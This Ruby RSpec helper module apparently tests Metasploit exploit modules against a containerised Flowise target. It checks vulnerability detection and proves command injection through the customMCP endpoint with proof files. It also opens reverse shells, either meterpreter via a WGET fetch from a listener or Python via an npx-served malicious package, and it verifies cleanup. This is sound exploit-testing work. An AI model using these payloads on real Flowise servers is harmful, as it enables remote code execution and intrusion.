# frozen_string_literal: true

require 'base64'
require 'English'
require 'stringio'
require 'timeout'
require 'rex/tar'
require_relative 'input_audit'

# Repeated independent target, session, account and restoration assertions.
module FlowiseAcceptance
  include FlowiseInputs
  EMAIL = 'module_target@module-target.test'
  PASSWORD = 'FlowiseNative!42'
  GENERIC_PAYLOAD = 'cmd/unix/generic'

  def artifact(name)
    File.join(target_runtime.fetch('artifacts'), name)
  end

  def rows
    File.readlines(artifact('flowise-inputs.jsonl')).map { |line| JSON.parse(line) }
  end

  def record(name, value)
    File.open(artifact(name), 'a') { |file| file.puts(JSON.generate(value)) }
  end

  def native(request)
    argv = ['python3', '-B', 'test/module_targets/flowise/control.py', JSON.generate(request)]
    output, error, status = Open3.capture3(*argv)
    record('native-control-status.jsonl', argv: argv, stdout: output, stderr: error, exitstatus: status.exitstatus)
    expect(status.success?).to be(true), error
    JSON.parse(output)
  end

  def wait_target(seconds, &block)
    Timeout.timeout(seconds) { wait_for_expect(1000, 0.1, &block) }
  end

  def credentials(owner)
    return {} if @profile == 'flowise_300'
    if @profile == 'flowise_basic'
      return { 'FLOWISE_USERNAME' => 'module_native', 'FLOWISE_PASSWORD' => 'module-target-basic-password' }
    end

    return {} if owner == FlowiseInputs::CUSTOM

    owner == FlowiseInputs::MCP ? { 'USERNAME' => EMAIL, 'PASSWORD' => PASSWORD } : { 'FLOWISE_EMAIL' => EMAIL, 'FLOWISE_PASSWORD' => PASSWORD }
  end

  def invoke(owner, options = {}, service: 'app', action: 'run', allow_errors: false)
    @input_offset = rows.length
    defaults = { 'SSL' => false, 'HttpClientTimeout' => 8, 'HttpTrace' => true, 'HttpTraceHeadersOnly' => true, 'AutoCheck' => true, 'ForceExploit' => false }
    unless owner == FlowiseInputs::ATO || action == 'check'
      generic = options.fetch('PAYLOAD', GENERIC_PAYLOAD) == GENERIC_PAYLOAD
      raise ArgumentError, "CMD is only valid with #{GENERIC_PAYLOAD} in this fixture" if options.key?('CMD') && !generic

      defaults.merge!('TARGET' => 0, 'PAYLOAD' => GENERIC_PAYLOAD, 'DisablePayloadHandler' => true)
      defaults['CMD'] = 'true' if generic
      defaults['WfsDelay'] = 0 unless owner == FlowiseInputs::MCP
    end
    defaults.merge!(credentials(owner)) unless owner == FlowiseInputs::ATO
    defaults.merge!('SRVHOST' => listener_host, 'SRVPORT' => 8080) if owner == FlowiseInputs::MCP && action != 'check'
    action = 'run -j' if owner == FlowiseInputs::MCP && action == 'run'
    output = run_target_module(owner, service, defaults.merge(options), action: action, allow_errors: allow_errors, command_timeout: 60)
    expect(output).not_to match(/Unknown datastore option|Invalid option|not a compatible payload/)
    @last_inputs = rows.drop(@input_offset)
    expect(@last_inputs).not_to be_empty unless owner == FlowiseInputs::MCP && action != 'check'
    output
  end

  def checkpoint(iteration)
    @before_state = native(action: 'state')
    @before_loot = loot_files
    @proof = "/tmp/module-target-flowise-#{@case_id}-#{iteration}"
    target_exec('app', 'test', '!', '-e', @proof)
    yield
  ensure
    original_error = $ERROR_INFO
    if @before_state && !@console_broken
      begin
        console_command('sessions -K')
        console_command('jobs -K')
        resources_removed
        result = native(action: 'restore_state', before: @before_state)
        record('restorations.jsonl', case_id: @case_id, iteration: iteration, result: result, original_error: original_error&.message)
        expect(result.fetch('restored')).to eq(@before_state)
      rescue RSpec::Expectations::ExpectationNotMetError, StandardError
        RSpec.world.wants_to_quit = true
        raise unless original_error
      end
    end
  end

  def loot_files
    Dir[File.join(target_runtime.fetch('artifacts'), 'msf-config', 'loot', '*')].select { |path| File.file?(path) }.sort
  end

  def absent(path = @proof)
    expect(target_exec('app', 'test', '!', '-e', path)).to eq('')
  end

  def check(owner, vulnerable:)
    output = invoke(owner, action: 'check', allow_errors: !vulnerable)
    expect(output).to include(vulnerable ? 'The target appears to be vulnerable' : 'The target is not exploitable')
  end

  def command_proof(owner, quiet: false, options: {})
    2.times do |iteration|
      checkpoint(iteration) do
        value = quiet ? '' : "FlowiseProof#{iteration}"
        command = quiet ? ":>#{@proof};printf${IFS}x>>#{@proof}-count" : "printf${IFS}%s${IFS}#{value}>#{@proof};printf${IFS}x>>#{@proof}-count"
        expect(target_exec('app', 'sh', '-c', command)).to eq('')
        expect(target_exec('app', 'cat', @proof)).to eq(value)
        expect(target_exec('app', 'cat', "#{@proof}-count")).to eq('x')
        target_exec('app', 'rm', '-f', '--', @proof, "#{@proof}-count")
        invoke(owner, { 'CMD' => command }.merge(options))
        expect(@last_inputs).to include(hash_including('kind' => 'COMMAND-ARG', 'command_base64' => Base64.strict_encode64(command)))
        requests = @last_inputs.select { |row| row['kind'] == 'REQUEST-ARGS/RESPONSE-BODY' && row['uri'].end_with?('/customMCP') }
        expect(requests.length).to eq(1)
        body = JSON.parse(Base64.strict_decode64(requests.fetch(0).fetch('data_base64')))
        expect(body.fetch('inputs').fetch('mcpServerConfig').to_s).to include(command)
        wait_target(15) { expect(target_exec('app', 'sh', '-c', 'if test -f "$1"; then printf PRESENT; fi', 'sh', @proof)).to eq('PRESENT') }
        expect(target_exec('app', 'cat', @proof)).to eq(value)
        count = target_exec('app', 'cat', "#{@proof}-count")
        expect(count).to match(/\Ax+\z/)
        expect(target_exec('app', 'stat', '-c', '%u', @proof).strip).to eq(@native.fetch('uid'))
        expect(loot_files).to eq(@before_loot)
        record('command-proofs.jsonl', owner: owner, command_base64: Base64.strict_encode64(command), exact_bytes_base64: Base64.strict_encode64(value), append_evaluations: count.length)
      end
    end
  end

  def refused(owner, options = {}, service: 'app')
    2.times do |iteration|
      checkpoint(iteration) do
        invoke(owner, { 'CMD' => "touch${IFS}#{@proof}" }.merge(options), service: service, allow_errors: true)
        if owner == FlowiseInputs::MCP
          if options['AutoCheck'] == false
            wait_target(35) { expect(rows.drop(@input_offset)).to include(hash_including('kind' => 'REQUEST-ARGS/RESPONSE-BODY', 'uri' => '/api/v1/node-load-method/customMCP')) }
          elsif options.fetch('PASSWORD', '').length.positive?
            wait_target(35) { expect(rows.drop(@input_offset)).to include(hash_including('kind' => 'REQUEST-ARGS/RESPONSE-BODY', 'uri' => '/api/v1/auth/login', 'status' => @native.fetch('wrong_password_status'))) }
          else
            wait_target(35) { expect(console_command('jobs -l')).to include('No active jobs') }
          end
          expect(rows.drop(@input_offset).select { |row| row['kind'] == 'HTTP-REQUEST' }).to eq([])
        end
        if %w[flowise_306 flowise_312].include?(@profile) && options['AutoCheck'] != false
          blocked = rows.drop(@input_offset)
          expect(blocked.select { |row| %w[COMMAND-ARG RETURNED-TAR].include?(row['kind']) }).to eq([])
          expect(blocked.select { |row| row['kind'] == 'REQUEST-ARGS/RESPONSE-BODY' && row['method'] == 'POST' }).to eq([])
        end
        absent
        expect(loot_files).to eq(@before_loot)
        expect(console_command('sessions -l')).to include('No active sessions')
      end
    end
  end

  def session_proof(owner)
    2.times do |iteration|
      checkpoint(iteration) do
        meterpreter = owner != FlowiseInputs::MCP
        payload = meterpreter ? 'cmd/linux/http/x64/meterpreter_reverse_tcp' : 'cmd/unix/reverse_python'
        options = { 'PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => 4444, 'DisablePayloadHandler' => false, 'SRVHOST' => listener_host, 'SRVPORT' => 8080 }
        options['PythonPath'] = '/usr/bin/python3' unless meterpreter
        if meterpreter
          options.delete('SRVHOST')
          options.delete('SRVPORT')
          options.merge!('FETCH_COMMAND' => 'WGET', 'FETCH_SRVHOST' => listener_host, 'FETCH_SRVPORT' => 8081, 'FETCH_DELETE' => true, 'FETCH_WRITABLE_DIR' => '/tmp', 'FETCH_FILENAME' => "module-target-flowise-fetch-#{@case_id}-#{iteration}", 'FETCH_URIPATH' => "module-target-flowise-fetch-#{@case_id}-#{iteration}", 'WfsDelay' => 10)
        end
        before_pids = target_exec('app', 'sh', '-c', 'printf "%s\\n" /proc/[0-9]*').lines.map { |path| File.basename(path.strip) }
        output = invoke(owner, options, action: 'run -z', allow_errors: true)
        session_id = nil
        wait_target(35) do
          status = console_command('irb -e \'puts "FLOWISE_SESSIONS="+framework.sessions.keys.to_json\'')
          ids = JSON.parse(status[/^FLOWISE_SESSIONS=(\[.*\])\r?$/, 1])
          expect(ids.length).to eq(1)
          session_id = ids.fetch(0).to_i
        end
        value = "FlowiseSession#{iteration}"
        if meterpreter
          reply = console_command("sessions -i #{session_id} -C getpid")
          pid = reply[/Current pid: (\d+)/, 1]
          script = "handle=framework.sessions[#{session_id}].fs.file.new(#{@proof.inspect},'wb'); begin; count=handle.write(#{value.inspect}); puts 'FLOWISE_WRITE='+count.to_s; ensure; handle.close; end"
          expect(console_command("irb -e #{script.inspect}")).to include("FLOWISE_WRITE=#{value.bytesize}")
        else
          command = "printf %s #{value}>#{@proof};echo FLOWISE_PID=$$"
          reply = console_command("sessions -i #{session_id} -c #{command.inspect}")
          pid = reply[/FLOWISE_PID=(\d+)/, 1]
        end
        expect(pid).not_to be_nil, reply
        expect(before_pids).not_to include(pid)
        peer_code = "puts 'FLOWISE_SESSION_HOST='+framework.sessions[#{session_id}].session_host.to_s"
        expect(console_command("irb -e #{peer_code.inspect}")).to include("FLOWISE_SESSION_HOST=#{target_runtime.fetch('module_endpoints').fetch('app').fetch('host')}")
        expect(target_exec('app', 'test', '-d', "/proc/#{pid}")).to eq('')
        expect(target_exec('app', 'cat', @proof)).to eq(value)
        expect(target_exec('app', 'stat', '-c', '%u', @proof).strip).to eq(@native.fetch('uid'))
        @last_inputs = rows.drop(@input_offset)
        if owner == FlowiseInputs::MCP
          archives = @last_inputs.select { |row| row['kind'] == 'RETURNED-TAR' }
          expect(archives.length).to eq(1)
          archive = Base64.strict_decode64(archives.fetch(0).fetch('returned_base64'))
          members = {}
          Rex::Tar::Reader.new(StringIO.new(archive)) { |tar| tar.each { |entry| members[entry.full_name] = entry.read if entry.file? } }
          expect(members.keys.sort).to eq(%w[package/index.js package/package.json])
          index = members.fetch('package/index.js')
          expect(index).to include('child_process')
          encoded = index[/Buffer\.from\('([^']+)','base64'\)/, 1]
          expect(encoded).not_to be_nil
          actual_payload = Base64.strict_decode64(encoded)
          expect(actual_payload).to include('/usr/bin/python3')
          record('archive-proofs.jsonl', archive_sha256: Digest::SHA256.hexdigest(archive), actual_payload_base64: encoded)
          expect(@last_inputs).to include(hash_including('kind' => 'HTTP-REQUEST', 'method' => 'GET', 'peer' => target_runtime.fetch('module_endpoints').fetch('app').fetch('host')))
          expect(@last_inputs).to include(hash_including('kind' => 'RESPONSE-ARGS', 'body_base64' => Base64.strict_encode64(archive)))
          posted = @last_inputs.find { |row| row['kind'] == 'REQUEST-ARGS/RESPONSE-BODY' && row['uri'] == '/api/v1/node-load-method/customMCP' }
          expect(posted).not_to be_nil
          config = JSON.parse(JSON.parse(Base64.strict_decode64(posted.fetch('data_base64'))).fetch('inputs').fetch('mcpServerConfig'))
          served = @last_inputs.find { |row| row['kind'] == 'HTTP-REQUEST' && row['method'] == 'GET' }.fetch('uri')
          expect(config).to eq('command' => 'npx', 'args' => ['--yes', "http://#{listener_host}:8080#{served}"])
        else
          command = @last_inputs.find { |row| row['kind'] == 'COMMAND-ARG' }
          expect(command).not_to be_nil
          actual_command = Base64.strict_decode64(command.fetch('command_base64'))
          expect(actual_command).to include(options.fetch('FETCH_FILENAME'))
          resource_path = "/#{options.fetch('FETCH_URIPATH')}"
          expect(actual_command).to include("http://#{listener_host}:8081#{resource_path}")
          @owned_http_paths ||= []
          @owned_http_paths << { port: 8081, path: resource_path, source: 'actual emitted fetch command' }
          request = @last_inputs.find { |row| row['kind'] == 'REQUEST-ARGS/RESPONSE-BODY' && row['uri'] == '/api/v1/node-load-method/customMCP' }
          expect(request).not_to be_nil
          expect(JSON.parse(Base64.strict_decode64(request.fetch('data_base64'))).fetch('inputs').fetch('mcpServerConfig')).to include(actual_command)
        end
        ancestry_script = 'const fs=require("fs"),before=JSON.parse(process.argv[2]);let p=Number(process.argv[1]),rows=[];while(p>1&&!before.includes(String(p))){const text=fs.readFileSync("/proc/"+p+"/status","utf8");rows.push({pid:p,status:text});p=Number(text.match(/^PPid:\s+(\d+)/m)[1]);}console.log(JSON.stringify(rows));'
        ancestry = JSON.parse(target_exec('app', 'node', '-e', ancestry_script, pid, JSON.generate(before_pids)))
        expect(ancestry.map { |row| row.fetch('pid').to_s }).to include(pid)
        record('session-phases.jsonl', session_id: session_id, phase: 'used_before_exit', ancestry: ancestry, proof: @proof)
        shutdown = meterpreter ? "framework.sessions[#{session_id}].exit" : "framework.sessions[#{session_id}].shell_write(\"exit\\n\")"
        console_command("irb -e #{shutdown.inspect}")
        ancestry.each do |process|
          wait_target(20) { expect(target_exec('app', 'sh', '-c', 'if test -e "$1"; then printf PRESENT; else printf ABSENT; fi', 'sh', "/proc/#{process.fetch('pid')}")).to eq('ABSENT') }
        end
        # Remote exit is already proved; close only the finished host shell.
        console_command("irb -e #{"framework.sessions[#{session_id}]&.shell_close".inspect}") unless meterpreter
        wait_target(15) { expect(console_command('sessions -l')).to include('No active sessions') }
        if meterpreter
          fetch_path = "/tmp/#{options.fetch('FETCH_FILENAME')}"
          wait_target(20) { expect(target_exec('app', 'sh', '-c', 'if test -e "$1"; then printf PRESENT; else printf ABSENT; fi', 'sh', fetch_path)).to eq('ABSENT') }
        end
        record('session-proofs.jsonl', owner: owner, payload: payload, session_id: session_id, pid: pid, exact_bytes_base64: Base64.strict_encode64(value), graceful_pid_absence: true, host_cleanup: meterpreter ? 'meterpreter_exit' : 'operator_shell_close_after_target_exit', output: output)
      end
    end
  end

  def resources_removed
    expect(console_command('sessions -l')).to include('No active sessions')
    expect(console_command('jobs -l')).to include('No active jobs')
    script = 'require "json"; rows=%w[/proc/net/tcp /proc/net/tcp6].flat_map { |path| File.readlines(path).drop(1).map(&:split) }; puts JSON.generate(rows.select { |row| row[3]=="0A" && row[1].split(":").last.to_i(16)==4444 })'
    wait_target(15) { expect(JSON.parse(target_exec('framework', 'ruby', '-e', script))).to eq([]) }
    pool = 'puts "FLOWISE_POOL="+JSON.generate((defined?(Rex::Proto::Http::Server) ? Rex::ServiceManager.instance.values.uniq.grep(Rex::Proto::Http::Server) : []).select { |server| [8080,8081].include?(server.listen_port) }.map { |server| {port:server.listen_port,resources:server.resources.keys,references:server.instance_variable_get(:@_references)} })'
    result = console_command("irb -e #{pool.inspect}")
    servers = JSON.parse(result[/^FLOWISE_POOL=(\[.*\])\r?$/, 1])
    expect(servers.flat_map { |server| server.fetch('resources') }).to eq([])
    paths = Array(@owned_http_paths) + rows.select { |row| row['kind'] == 'HTTP-REQUEST' }.map { |row| { port: 8080, path: row.fetch('uri'), source: 'actual owner HTTP request callback' } }
    paths = paths.uniq
    [8080, 8081].each do |port|
      paths << { port: port, path: '/module-target-resource-absent', source: 'unused port probe' } unless paths.any? { |item| item.fetch(:port) == port }
    end
    probe = 'require "net/http";require "json";begin;u=URI(ARGV[0]);r=Net::HTTP.start(u.host,u.port,open_timeout:2,read_timeout:2){|h|h.get(u)};puts JSON.generate(code:r.code.to_i);rescue Errno::ECONNREFUSED;puts JSON.generate(state:"refused");end'
    observations = paths.map do |item|
      response = JSON.parse(target_exec('framework', 'ruby', '-e', probe, "http://#{listener_host}:#{item.fetch(:port)}#{item.fetch(:path)}"))
      expect(response['state'] == 'refused' || response['code'] == 404).to be(true), response.inspect
      item.merge(response: response)
    end
    record('http-resource-removal.jsonl', servers: servers, observations: observations)
  end

  def console_command(command, timeout: 40)
    raise Acceptance::ChildProcessRecvError, 'Flowise console transport already failed' if @console_broken

    super
  rescue Acceptance::ChildProcessRecvError, Acceptance::ChildProcessTimeoutError, EOFError, Errno::EPIPE
    @console_broken = true
    RSpec.world.wants_to_quit = true
    raise
  end
end
